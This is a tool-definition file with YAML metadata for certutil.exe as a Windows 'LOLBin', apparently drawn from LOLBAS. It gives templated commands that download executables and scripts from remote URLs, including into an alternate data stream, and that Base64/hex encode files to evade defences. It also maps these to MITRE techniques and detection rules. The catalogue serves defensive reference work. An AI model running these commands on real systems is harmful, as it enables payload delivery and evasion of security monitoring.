---
id: windows-download-certutil
namespace: windows:download:certutil
name: certutil
description: 'Windows binary used for handling certificates Located at: C:\Windows\System32\certutil.exe;
  C:\Windows\SysWOW64\certutil.exe.'
author: Oddvar Moe
version: 1.0.0
capabilities:
- network.transfer.download
- system.file.alternate-data-stream
- system.file.encode
- system.file.decode
platforms:
- windows
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - filesystem_write
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- certutil
parameters: []
features:
- encryption
- file-system
- local
- network-intensive
- pipes-stdin
- pipes-stdout
- streaming
execution:
  template: certutil
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Download and save an executable to disk in the current folder. (Download
    file from Internet)
  command: certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}
- description: Download and save an executable to disk in the current folder when
    a file path is specified, or `%LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\<hash>`
    when not. (Download file from Internet)
  command: certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe}
- description: Download and save a .ps1 file to an Alternate Data Stream (ADS). (Download
    file from Internet and save it in an NTFS Alternate Data Stream)
  command: certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt
- description: Download and save an executable to `%LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\<hash>`.
    (Download file from Internet)
  command: certutil.exe -URL {REMOTEURL:.exe}
- description: Command to encode a file using Base64 (Encode files to evade defensive
    measures)
  command: certutil -encode {PATH} {PATH:.base64}
- description: Command to decode a Base64 encoded file. (Decode files to evade defensive
    measures)
  command: certutil -decode {PATH:.base64} {PATH}
- description: Command to decode a hexadecimal-encoded file. (Decode files to evade
    defensive measures)
  command: certutil -decodehex {PATH:.hex} {PATH}
references:
- label: '984380793383370752'
  url: https://twitter.com/Moriarty_Meng/status/984380793383370752
- label: '620107926288515072'
  url: https://twitter.com/mattifestation/status/620107926288515072
- label: '1087685529016193025'
  url: https://twitter.com/egre55/status/1087685529016193025
- label: ''
  url: https://www.hexacorn.com/blog/2020/08/23/certutil-one-more-gui-lolbin/
techniques:
- exfiltration
- defense-evasion
mitre_ids:
- T1105
- T1564.004
- T1027.013
- T1140
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_download.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_encode.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_decode.yml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/4a11ef9514938e7a7e32cf5f379e975cebf5aed3/rules/windows/defense_evasion_suspicious_certutil_commands.toml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/command_and_control_certutil_network_connection.toml
- type: splunk
  url: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_urlcache_and_split_arguments.yml
- type: splunk
  url: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_verifyctl_and_split_arguments.yml
- type: splunk
  url: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_with_decode_argument.yml
- type: ioc
  description: Certutil.exe creating new files on disk
- type: ioc
  description: Useragent Microsoft-CryptoAPI/10.0
- type: ioc
  description: Useragent CertUtil URL Agent
install:
- method: choco
  package_name: certutil
  commands:
  - choco install certutil
---

# certutil

certutil is a Windows LOLBin. Windows binary used for handling certificates Located at: C:\Windows\System32\certutil.exe; C:\Windows\SysWOW64\certutil.exe.
